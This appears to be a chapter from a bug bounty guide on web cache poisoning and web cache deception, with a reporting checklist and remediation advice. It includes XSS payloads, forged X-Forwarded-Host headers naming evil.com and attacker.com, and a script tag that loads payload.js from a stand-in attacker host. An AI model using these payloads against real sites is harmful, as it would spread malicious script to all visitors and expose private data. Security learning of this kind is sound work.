# Chapter 30 – Web Cache Poisoning & CDN Exploitation

## Why Cache Poisoning Pays Big
Web cache poisoning lets an attacker **control what other users receive** by injecting malicious responses into:
- CDNs (Cloudflare, Akamai, Fastly)
- Load balancer caches
- Reverse proxies
- Application-level caches

High-severity outcomes:
- Stored XSS served to all users
- Login page defacement
- Account takeover via poisoned redirects
- API failures
- DoS for entire regions
- Credential theft (phishing via cache)

This is a **Top 3 advanced bug bounty category** (often $10,000–$40,000).

---

# Core Concepts

## What Gets Cached
Caches store responses based on:
- URL/path  
- Query parameters  
- HTTP method  
- Headers specified in `Vary`  
- CDN rules  

**Attackers exploit mismatch between cache keys and application logic.**

---

## Cache Key Components
Most CDNs use:
scheme + host + path + sorted_query_params

But apps sometimes behave differently, causing **cache key confusion**.

Example mismatch:
- CDN ignores `foo=bar`
- Application uses `foo=bar`

This difference = vulnerability.

---

# Two Big Attack Classes
## 1. Web Cache Poisoning
You inject a malicious response into the cache.
All victims receive your poisoned payload.

## 2. Web Cache Deception
You trick users into caching their *private* data in public cache.

---

# Attack Type 1: Web Cache Poisoning

## Step 1 — Find an Unkeyed Input
Unkeyed input = something that **changes the response** but is NOT included in the cache key.

Checklist:
- `X-Forwarded-*` headers (most common)
- `X-Host`
- `X-Original-URL`
- `X-Rewrite-URL`
- `X-Forwarded-Proto`
- `X-Forwarded-Port`
- `X-Forwarded-For`
- Fat GET parameters such as:
  - `callback=`
  - `_method=`
  - `redirect=`
  - `next=`
- Headers that trigger debug/logging mode
- Cookies ignored by CDN but used by application

Test:
X-Forwarded-Host: evil.com
X-Forwarded-Proto: javascript
X-Rewrite-URL: /evil
callback=alert(1)

If the response changes but HITs the cache → vulnerability.

---

## Step 2 — Identify Cache Behavior (HIT/MISS)
Use headers to observe caching:
- `CF-Cache-Status: HIT`
- `X-Cache: HIT`
- `Age: 45`
- `X-Cache-Status: REVALIDATED`

If you see a HIT after modifying some input → jackpot.

---

## Step 3 — Attempt Payload Injection
Goal: Inject content into HTML/JS/XML.

Try:
### HTML Injection
?callback=<script>alert(1)</script>


### JS Injection


X-Forwarded-Host: attacker.com


### Cache Poisoning Script
```html
<script src="https://evil.com/payload.js"></script>

Step 4 — Lock It In the Cache

Once you confirm poisoning:

Choose a payload

Trigger cache fill

Wait until it becomes HIT

Prove victim impact

Attack Type 2: Web Cache Deception (WCD)

Trick the CDN into caching private user content under a public path.

Example:

https://example.com/profile.php/nonexistent.css


CDN thinks it’s static (.css)
Backend still returns sensitive HTML.

Victim visits link → their personal dashboard gets cached → attacker can fetch cached version.

Impact:

Session tokens

Billing info

Private messages

Email addresses

Entire HTML auth pages

Advanced Cache Poisoning Techniques
1. Parameter Cloaking

CDNs normalize parameters differently:

?a=1;%61=2


Backend sees:

a=2


but CDN caches:

a=1


This desync enables poisoning.

2. Fat Parameter Attacks

CDNs ignore duplicate params:

?id=1&id=evil


Backend might accept the last one.

3. Header Smuggling (Not HPACK)

Some CDNs mishandle header parsing:

Foo: bar
     baz


or:

X-Forwarded-For: victim,attacker

4. Surrogate Keys

Some CDNs group cache keys under “surrogate keys”:

Affects purge logic

Allows poisoning mass content via one endpoint

High-Value Targets

Login pages (cached incorrectly)

Password reset pages with tokens

OAuth callback endpoints

Static JS files that developers dynamically generate

API responses used in dashboards

CDN-managed error pages (500/404)

JSONP endpoints

Redirect logic

Template engines returning HTML fragments

Automation Ideas

Write a parameter fuzzer that appends:

junk=1

__proto__=

callback=

Encoded payloads

Create a header mutator:

Random X-Forwarded-*

Smuggled values

Detect cache HIT automatically with timing:

First request → MISS (slow)

Second request → HIT (fast)

Build payload maximizer that:

Injects into <script> tags

Forces error messages into page

Targets JSON responses

Reporting Tips

Include:

The unkeyed input found

Cache HIT proof

Payload used

Impact on victims

Screenshot of poisoned response

Reproduction sequence

TTL (how long attack persists)

Cache poisoning reports are high-impact — write them cleanly.

Remediation

Add strict Vary headers

Sanitize all reflected inputs

Validate X-Forwarded-* headers

Disable caching of dynamic pages

Use allowlisted CDNs or known-safe paths

Block “fat” or duplicated parameters

Enforce strict routing in reverse proxy

Summary

Web cache poisoning is one of the most profitable bug classes because:

It affects every user simultaneously

It often leads to stored XSS

It bypasses WAFs

It affects CDNs globally

It’s subtle and rarely tested by devs

Mastering this puts you in the top 5% of bug bounty hunters.
